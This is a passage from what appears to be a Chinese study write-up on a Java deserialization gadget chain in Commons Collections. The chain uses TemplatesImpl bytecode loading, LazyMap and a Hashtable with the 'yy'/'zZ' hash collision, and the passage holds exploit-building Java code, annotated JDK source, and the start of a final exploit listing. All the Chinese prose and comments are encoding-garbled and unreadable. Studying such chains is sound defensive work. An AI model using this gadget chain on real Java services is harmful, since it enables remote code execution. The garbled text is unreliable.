class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//ä¸CC1å‰åŠéƒ¨åˆ†é“¾å­ç»“åˆä¸€ä¸‹</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨</p><ul><li>æŠŠæ–­ç‚¹æ‰“åœ¨äº† <code>AbstractMap.equals()</code> çš„åœ°æ–¹ï¼Œç»“æœå‘ç°å±…ç„¶æ²¡æœ‰æ‰§è¡Œåˆ° .equals() è¿™ä¸ªæ–¹æ³•ï¼Œå»çœ‹ä¸€çœ‹ yso çš„é“¾å­æ˜¯æ€ä¹ˆå†™çš„ã€‚</li></ul><p><img src="/img/CC4/c18.png"></p><p>yso è¿™é‡Œçš„é“¾å­æ¯”æˆ‘ä»¬å¤šäº†ä¸€ä¸ª mapï¼Œè€Œä¸”å°†ä¸¤ä¸ª map è¿›è¡Œäº†æ¯”è¾ƒï¼Œä¸€çœ‹åˆ°è¿™ä¸ªå°±æ˜ç™½äº†ã€‚</p><ul><li><strong>ä¸ºä»€ä¹ˆè¦è°ƒç”¨ä¸¤æ¬¡ <code>put()</code>?</strong></li></ul><p>æˆ‘ä»¬éœ€è¦è°ƒç”¨çš„ <code>e.key.equal()</code> æ–¹æ³•æ˜¯åœ¨ for å¾ªç¯é‡Œé¢çš„ï¼Œéœ€è¦è¿›å…¥åˆ°è¿™ for å¾ªç¯æ‰èƒ½è°ƒç”¨ã€‚</p><p><code>Hashtable</code> çš„ <code>reconstitutionPut()</code> æ–¹æ³•æ˜¯è¢«éå†è°ƒç”¨çš„ï¼Œ</p><p>ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šèµ°å…¥åˆ° <code>reconstitutionPut()</code> æ–¹æ³• for å¾ªç¯é‡Œé¢ï¼Œå› ä¸º <code>tab[index]</code> çš„å†…å®¹æ˜¯ç©ºçš„ï¼Œåœ¨ä¸‹é¢ä¼šå¯¹ <code>tab[index]</code> è¿›è¡Œèµ‹å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>&#123;<br>    <span class="hljs-comment">// ç§æœ‰æ–¹æ³• reconstitutionPutï¼šåœ¨ååºåˆ—åŒ–é‡ç»„è¿‡ç¨‹ä¸­ï¼Œå°†é”®ï¼ˆKeyï¼‰å’Œå€¼ï¼ˆValueï¼‰æ”¾å…¥æ¡ç›®æ•°ç»„ï¼ˆtabï¼‰ä¸­ã€‚</span><br>    <span class="hljs-comment">// å‚æ•° tab: å“ˆå¸Œæ¡¶æ•°ç»„ï¼ˆå­˜å‚¨é“¾è¡¨çš„æ•°ç»„ï¼‰</span><br>    <span class="hljs-comment">// å‚æ•° key: è¦æ”¾å…¥çš„é”®</span><br>    <span class="hljs-comment">// å‚æ•° value: è¦æ”¾å…¥çš„å€¼</span><br>    <span class="hljs-comment">// å¯èƒ½æŠ›å‡º StreamCorruptedException: è¡¨ç¤ºåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ£€æµ‹åˆ°æ•°æ®æµæŸåå¼‚å¸¸</span><br><br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// å¦‚æœä¼ å…¥çš„å€¼ä¸ºç©ºï¼ˆnullï¼‰ï¼Œåˆ™æŠ›å‡º StreamCorruptedException å¼‚å¸¸ã€‚</span><br>    <span class="hljs-comment">// ï¼ˆå› ä¸º Hashtable é€šå¸¸ä¸å…è®¸å­˜å‚¨ null å€¼ï¼‰</span><br><br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-comment">// ç¡®ä¿è¯¥é”®å°šæœªå­˜åœ¨äºå“ˆå¸Œè¡¨ä¸­ã€‚</span><br>    <span class="hljs-comment">// åœ¨ååºåˆ—åŒ–çš„ç‰ˆæœ¬ä¸­ï¼Œè¿™ç§æƒ…å†µä¸åº”è¯¥å‘ç”Ÿã€‚</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>    <span class="hljs-comment">// è®¡ç®—é”®çš„å“ˆå¸Œç ï¼ˆhashCodeï¼‰</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-comment">// é€šè¿‡å°†å“ˆå¸Œç ä¸ 0x7FFFFFFFï¼ˆæœ€å¤§æ­£æ•´æ•°ï¼‰è¿›è¡ŒæŒ‰ä½ä¸æ“ä½œç¡®ä¿å…¶ä¸ºéè´Ÿæ•°ï¼Œ</span><br>    <span class="hljs-comment">// ç„¶åå¯¹æ•°ç»„é•¿åº¦å–æ¨¡ï¼Œå¾—åˆ°è¯¥é”®å€¼å¯¹åº”æ”¾å…¥çš„æ•°ç»„ä¸‹æ ‡ï¼ˆindexï¼‰ã€‚</span><br><br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-comment">// éå†è¯¥æ•°ç»„ä¸‹æ ‡å¤„çš„é“¾è¡¨ï¼ˆå¦‚æœå­˜åœ¨ï¼‰</span><br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°äº†ä¸€ä¸ªå·²å­˜åœ¨çš„æ¡ç›®ï¼Œå…¶å“ˆå¸Œç ä¸å½“å‰é”®çš„å“ˆå¸Œç ç›¸åŒï¼Œ</span><br>            <span class="hljs-comment">// å¹¶ä¸”é”®æœ¬èº«ä¹Ÿç›¸ç­‰ï¼ˆé€šè¿‡ equals æ–¹æ³•åˆ¤æ–­ï¼‰</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            <span class="hljs-comment">// åˆ™æŠ›å‡º StreamCorruptedException å¼‚å¸¸ã€‚</span><br>            <span class="hljs-comment">// å› ä¸ºåœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¸åº”è¯¥å‡ºç°é‡å¤çš„é”®ï¼Œè¿™è¡¨æ˜æ•°æ®æµå¯èƒ½å·²æŸåã€‚</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-comment">// åˆ›å»ºæ–°çš„æ¡ç›®ã€‚</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªä¸æ£€æŸ¥çš„è½¬æ¢ï¼Œè·å–å½“å‰æ•°ç»„ä¸‹æ ‡å¤„çš„ç¬¬ä¸€ä¸ªæ¡ç›®ï¼ˆé“¾è¡¨å¤´èŠ‚ç‚¹ï¼‰</span><br><br>    tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>    <span class="hljs-comment">// åœ¨æ•°ç»„çš„ index ä½ç½®åˆ›å»ºä¸€ä¸ªæ–°çš„ Entry å¯¹è±¡ã€‚</span><br>    <span class="hljs-comment">// è¿™ä¸ªæ–°æ¡ç›®å°†ï¼š</span><br>    <span class="hljs-comment">//   - å­˜å‚¨å½“å‰çš„ hashã€keyã€value</span><br>    <span class="hljs-comment">//   - å°†å…¶ next æŒ‡é’ˆæŒ‡å‘åŸæ¥çš„é“¾è¡¨å¤´ï¼ˆeï¼‰</span><br>    <span class="hljs-comment">// è¿™ç›¸å½“äºå°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°é“¾è¡¨çš„å¤´éƒ¨ã€‚</span><br><br>    count++;<br>    <span class="hljs-comment">// å¢åŠ å“ˆå¸Œè¡¨çš„æ¡ç›®è®¡æ•°å™¨ã€‚</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>ä¸ºä»€ä¹ˆè°ƒç”¨çš„ä¸¤æ¬¡<code>put()</code>å…¶ä¸­mapä¸­keyçš„å€¼åˆ†åˆ«ä¸ºyyå’ŒzZ?</strong></li></ul><p>ç¬¬äºŒæ¬¡è°ƒç”¨ <code>reconstitutionPut()</code> è¿›å…¥åˆ° for å¾ªç¯çš„æ—¶å€™ï¼Œæ­¤æ—¶ e æ˜¯ä» tab ä¸­å–å‡ºçš„ lazyMap1 ï¼Œç„¶åè¿›å…¥åˆ°åˆ¤æ–­ä¸­ï¼Œè¦ç»è¿‡ <code>(e.hash == hash)</code> åˆ¤æ–­ä¸ºçœŸæ‰èƒ½èµ°åˆ°æˆ‘ä»¬æƒ³è¦çš„ <code>e.key.equal()</code> æ–¹æ³•ä¸­ã€‚è¿™é‡Œåˆ¤æ–­è¦æ±‚å–å‡ºæ¥çš„ lazyMap1 å¯¹è±¡çš„hashå€¼è¦ç­‰éƒ½ç°åœ¨å¯¹è±¡ä¹Ÿå°±æ˜¯ lazyMap2 çš„hashå€¼ï¼Œè¿™é‡Œçš„hashå€¼æ˜¯é€šè¿‡ lazyMap å¯¹è±¡ä¸­çš„ <code>key.hashCode()</code> å¾—åˆ°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ lazyMap1 çš„ hash å€¼å°±æ˜¯ <code>&quot;yy&quot;.hashCode()</code> ï¼ŒlazyMap2 çš„ hash å€¼å°±æ˜¯ <code>&quot;zZ&quot;.hashCode()</code> ï¼Œè€Œåœ¨ java ä¸­æœ‰ä¸€ä¸ªå° bugï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;yy&quot;</span>.hashCode() == <span class="hljs-string">&quot;zZ&quot;</span>.hashCode()<br></code></pre></td></tr></table></figure><p>forå¾ªç¯æ˜¯è¿›è¡Œäº†ä¸€ä¸ªåˆ—è¡¨çš„éå†ï¼Œifä¸­å‰åŠå¥æ˜¯å¦‚æœæ‰¾åˆ°äº†ä¸€ä¸ªå·²å­˜åœ¨çš„æ¡ç›®ï¼Œå…¶å“ˆå¸Œç ä¸å½“å‰é”®çš„å“ˆå¸Œç ç›¸åŒã€‚</p><p><code>yy</code> å’Œ <code>zZ</code> ç”± <code>hashCode()</code> è®¡ç®—å‡ºæ¥çš„å€¼æ˜¯ä¸€æ ·çš„ã€‚æ­£æ˜¯è¿™ä¸ªå° bug è®©è¿™é‡Œèƒ½å¤Ÿåˆ©ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦å°† map ä¸­ <code>put()</code> çš„å€¼è®¾ç½®ä¸º <code>yy</code> å’Œ <code>zZ</code>ï¼Œæ‰èƒ½èµ°åˆ°æˆ‘ä»¬æƒ³è¦çš„ <code>e.key.equal()</code> æ–¹æ³•ä¸­ã€‚</p><ul><li><strong>ä¸ºä»€ä¹ˆåœ¨è°ƒç”¨å®Œ <code>HashTable.put()</code> ä¹‹åï¼Œè¿˜éœ€è¦åœ¨ map2 ä¸­ <code>remove()</code> æ‰ yyï¼Ÿ</strong></li></ul><p>è¿™æ˜¯å› ä¸º <code>HashTable.put()</code> å®é™…ä¸Šä¹Ÿä¼šè°ƒç”¨åˆ° <code>equals()</code> æ–¹æ³•ï¼š</p><p>å½“è°ƒç”¨å®Œ <code>equals()</code> æ–¹æ³•åï¼Œä¼šè¿›å…¥LazyMapçš„getæ–¹æ³•ã€‚</p><p>è®°å¾—å—ï¼Œè¿™ä¸ªç±»å°±æ˜¯ç”¨æ¥åŠ å…¥æ–°çš„é”®ï¼Œè°ƒç”¨getå°†æ–°çš„å€¼åŠ å…¥keyä¸­</p><p>LazyMap2 çš„ key ä¸­å°±ä¼šå¢åŠ ä¸€ä¸ª yy é”®ï¼š</p><p><img src="/img/CC4/c20.png"></p><p>åœ¨åç»­AbstractMapçš„equalsæ–¹æ³•ä¸­æ£€æµ‹åˆ°ä¸¤ä¸ª Map çš„å¤§å°(åŒ…å«çš„é”®å€¼å¯¹æ•°é‡)ä¸ç›¸ç­‰ç›´æ¥è¿”å›false</p><p>æ— æ³•è°ƒç”¨getæ–¹æ³•ï¼Œè§¦å‘æ¥ä¸‹æ¥çš„åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-comment">// å…¬å…±æ–¹æ³•ï¼šåˆ¤æ–­å½“å‰å¯¹è±¡æ˜¯å¦ä¸ç»™å®šå¯¹è±¡ o ç›¸ç­‰</span><br>    <span class="hljs-comment">// è¿”å›å€¼ï¼štrue è¡¨ç¤ºç›¸ç­‰ï¼Œfalse è¡¨ç¤ºä¸ç›¸ç­‰</span><br><br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-comment">// å¦‚æœæ¯”è¾ƒçš„å¯¹è±¡ o å°±æ˜¯å½“å‰å¯¹è±¡æœ¬èº«ï¼ˆå†…å­˜åœ°å€ç›¸åŒï¼‰</span><br>    <span class="hljs-comment">// åˆ™æ¯«æ— ç–‘é—®å®ƒä»¬æ˜¯ç›¸ç­‰çš„ï¼Œç›´æ¥è¿”å› true</span><br><br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// å¦‚æœå¯¹è±¡ o ä¸æ˜¯ Map ç±»å‹ï¼ˆæˆ–ä¸æ˜¯ Map æ¥å£çš„å®ç°ç±»ï¼‰</span><br>    <span class="hljs-comment">// åˆ™ç±»å‹ä¸åŒï¼Œè‚¯å®šä¸ç›¸ç­‰ï¼Œè¿”å› false</span><br><br>    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>    <span class="hljs-comment">// å°†å¯¹è±¡ o å¼ºåˆ¶è½¬æ¢ä¸º Map ç±»å‹ï¼Œæ–¹ä¾¿åç»­æ“ä½œ</span><br>    <span class="hljs-comment">// è¿™é‡Œçš„ &lt;?,?&gt; è¡¨ç¤ºé”®å’Œå€¼å¯ä»¥æ˜¯ä»»ä½•ç±»å‹</span><br><br>    <span class="hljs-keyword">if</span> (m.size() != size())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// å¦‚æœä¸¤ä¸ª Map çš„å¤§å°ï¼ˆåŒ…å«çš„é”®å€¼å¯¹æ•°é‡ï¼‰ä¸ç›¸ç­‰</span><br>    <span class="hljs-comment">// åˆ™å®ƒä»¬è‚¯å®šä¸ç›¸ç­‰ï¼Œè¿”å› falseï¼ˆè¿™æ˜¯ä¸€ç§å¿«é€Ÿå¤±è´¥ä¼˜åŒ–ï¼‰</span><br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// å¼€å§‹é€ä¸ªæ¯”è¾ƒé”®å€¼å¯¹ï¼Œä½¿ç”¨ try å—æ•è·å¯èƒ½å‡ºç°çš„å¼‚å¸¸</span><br>        <br>        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>        <span class="hljs-comment">// è·å–å½“å‰ Map çš„æ¡ç›®é›†åˆï¼ˆentrySetï¼‰çš„è¿­ä»£å™¨</span><br>        <span class="hljs-comment">// ç”¨äºéå†å½“å‰ Map çš„æ‰€æœ‰é”®å€¼å¯¹</span><br><br>        <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>            <span class="hljs-comment">// éå†å½“å‰ Map çš„æ¯ä¸€ä¸ªé”®å€¼å¯¹</span><br>            Entry&lt;K,V&gt; e = i.next();<br>            <span class="hljs-comment">// è·å–ä¸‹ä¸€ä¸ªé”®å€¼å¯¹æ¡ç›®</span><br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>            <span class="hljs-comment">// è·å–å½“å‰æ¡ç›®çš„é”®</span><br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>            <span class="hljs-comment">// è·å–å½“å‰æ¡ç›®çš„å€¼</span><br><br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// å¦‚æœå½“å‰æ¡ç›®çš„å€¼ä¸º null</span><br>                <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))<br>                    <span class="hljs-comment">// æ£€æŸ¥ç›®æ ‡ Map m ä¸­ï¼š</span><br>                    <span class="hljs-comment">//   1. ä½¿ç”¨ç›¸åŒé”®è·å–çš„å€¼å¿…é¡»ä¹Ÿæ˜¯ null (m.get(key)==null)</span><br>                    <span class="hljs-comment">//   2. å¹¶ä¸”å¿…é¡»åŒ…å«è¿™ä¸ªé”® (m.containsKey(key))</span><br>                    <span class="hljs-comment">// å¦‚æœè¿™ä¸¤ä¸ªæ¡ä»¶ä¸åŒæ—¶æ»¡è¶³ï¼Œåˆ™è¿”å› false</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// å¦‚æœå½“å‰æ¡ç›®çš„å€¼ä¸ä¸º null</span><br>                <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br>                    <span class="hljs-comment">// æ£€æŸ¥å½“å‰å€¼æ˜¯å¦ä¸ç›®æ ‡ Map m ä¸­ç›¸åŒé”®å¯¹åº”çš„å€¼ç›¸ç­‰</span><br>                    <span class="hljs-comment">// ä½¿ç”¨å€¼çš„ equals æ–¹æ³•è¿›è¡Œæ¯”è¾ƒ</span><br>                    <span class="hljs-comment">// å¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™è¿”å› false</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// å¾ªç¯ç»“æŸï¼šå½“å‰ Map çš„æ‰€æœ‰é”®å€¼å¯¹éƒ½åœ¨ç›®æ ‡ Map ä¸­æ‰¾åˆ°äº†åŒ¹é…é¡¹</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>        <span class="hljs-comment">// æ•è·ç±»å‹è½¬æ¢å¼‚å¸¸ï¼šå¯èƒ½åœ¨å¼ºåˆ¶ç±»å‹è½¬æ¢æˆ–æ–¹æ³•è°ƒç”¨æ—¶å‘ç”Ÿ</span><br>        <span class="hljs-comment">// ä¾‹å¦‚é”®æˆ–å€¼çš„ç±»å‹ä¸å…¼å®¹ï¼Œè¿”å› false</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>        <span class="hljs-comment">// æ•è·ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼šå¯èƒ½åœ¨è°ƒç”¨ null å¯¹è±¡çš„æ–¹æ³•æ—¶å‘ç”Ÿ</span><br>        <span class="hljs-comment">// æˆ–è€…ç›®æ ‡ Map ä¸æ”¯æŒ null é”®/å€¼ï¼Œè¿”å› false</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-comment">// å¦‚æœç¨‹åºæ‰§è¡Œåˆ°è¿™é‡Œï¼Œè¯´æ˜ï¼š</span><br>    <span class="hljs-comment">//   - ä¸¤ä¸ª Map å¤§å°ç›¸åŒ</span><br>    <span class="hljs-comment">//   - å½“å‰ Map çš„æ¯ä¸ªé”®å€¼å¯¹éƒ½åœ¨ç›®æ ‡ Map ä¸­å­˜åœ¨å¯¹åº”å…³ç³»</span><br>    <span class="hljs-comment">//   - æ‰€æœ‰å¯¹åº”çš„å€¼éƒ½ç›¸ç­‰ï¼ˆæ­£ç¡®å¤„ç†äº† null å€¼æƒ…å†µï¼‰</span><br>    <span class="hljs-comment">//   - æ¯”è¾ƒè¿‡ç¨‹ä¸­æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸</span><br>    <span class="hljs-comment">// å› æ­¤åˆ¤å®šä¸¤ä¸ª Map ç›¸ç­‰ï¼Œè¿”å› true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¦åˆ é™¤yyé”®</p><ul><li>æœ€ååŒæ ·çš„ï¼Œæˆ‘ä»¬è¦ååºåˆ—åŒ–æ‰è§¦å‘é“¾å­ã€‚æ‰€ä»¥è¦å…ˆç»™chainTransformerå¯¹è±¡ä¼ å…¥ä¸€ä¸ªæ²¡ç”¨çš„ä¸œè¥¿ï¼Œå†é€šè¿‡åå°„ä¿®æ”¹å€¼</li></ul><p>æœ€ç»ˆEXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 